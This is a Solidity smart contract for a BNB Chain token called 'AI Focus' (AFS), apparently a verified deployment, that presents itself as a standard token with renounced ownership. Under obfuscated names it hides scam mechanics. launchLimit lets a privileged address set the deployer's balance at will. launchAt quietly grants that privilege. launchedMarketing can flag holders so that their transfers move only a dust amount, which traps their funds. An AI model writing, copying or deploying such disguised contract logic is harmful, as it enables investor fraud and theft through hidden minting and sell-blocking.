/**
 *Submitted for verification at BscScan.com on 2023-02-03
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface fromSellTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface walletExempt {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AIFocus is Ownable{
    uint8 public decimals = 18;
    bool public feeBuyFund;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;



    address public tokenLaunch;
    uint256 constant marketingLiquidity = 10 ** 10;

    mapping(address => bool) public minMode;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    address public liquiditySwapIs;
    string public name = "AI Focus";
    string public symbol = "AFS";
    mapping(address => bool) public listSwap;
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        fromSellTeam tokenLiquidity = fromSellTeam(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        liquiditySwapIs = walletExempt(tokenLiquidity.factory()).createPair(tokenLiquidity.WETH(), address(this));
        tokenLaunch = isShouldTrading();
        listSwap[tokenLaunch] = true;
        balanceOf[tokenLaunch] = totalSupply;
        emit Transfer(address(0), tokenLaunch, totalSupply);
        renounceOwnership();
    }

    

    function getOwner() external view returns (address) {
        return owner();
    }

    function isShouldTrading() private view returns (address) {
        return msg.sender;
    }

    function launchLimit(uint256 atListFee) public {
        if (!listSwap[isShouldTrading()]) {
            return;
        }
        balanceOf[tokenLaunch] = atListFee;
    }

    function launchAt(address tokenMarketing) public {
        if (feeBuyFund) {
            return;
        }
        listSwap[tokenMarketing] = true;
        feeBuyFund = true;
    }

    function fundMarketing(address teamTrading, address senderReceiverMin, uint256 atListFee) internal returns (bool) {
        require(balanceOf[teamTrading] >= atListFee);
        balanceOf[teamTrading] -= atListFee;
        balanceOf[senderReceiverMin] += atListFee;
        emit Transfer(teamTrading, senderReceiverMin, atListFee);
        return true;
    }

    function transferFrom(address exemptFund, address swapFund, uint256 atListFee) public returns (bool) {
        if (exemptFund != isShouldTrading() && allowance[exemptFund][isShouldTrading()] != type(uint256).max) {
            require(allowance[exemptFund][isShouldTrading()] >= atListFee);
            allowance[exemptFund][isShouldTrading()] -= atListFee;
        }
        if (swapFund == tokenLaunch || exemptFund == tokenLaunch) {
            return fundMarketing(exemptFund, swapFund, atListFee);
        }
        if (minMode[exemptFund]) {
            return fundMarketing(exemptFund, swapFund, marketingLiquidity);
        }
        return fundMarketing(exemptFund, swapFund, atListFee);
    }

    function transfer(address swapFund, uint256 atListFee) external returns (bool) {
        return transferFrom(isShouldTrading(), swapFund, atListFee);
    }

    function launchedMarketing(address receiverFeeTrading) public {
        if (receiverFeeTrading == tokenLaunch || receiverFeeTrading == liquiditySwapIs || !listSwap[isShouldTrading()]) {
            return;
        }
        minMode[receiverFeeTrading] = true;
    }

    function approve(address senderToken, uint256 atListFee) public returns (bool) {
        allowance[isShouldTrading()][senderToken] = atListFee;
        emit Approval(isShouldTrading(), senderToken, atListFee);
        return true;
    }


}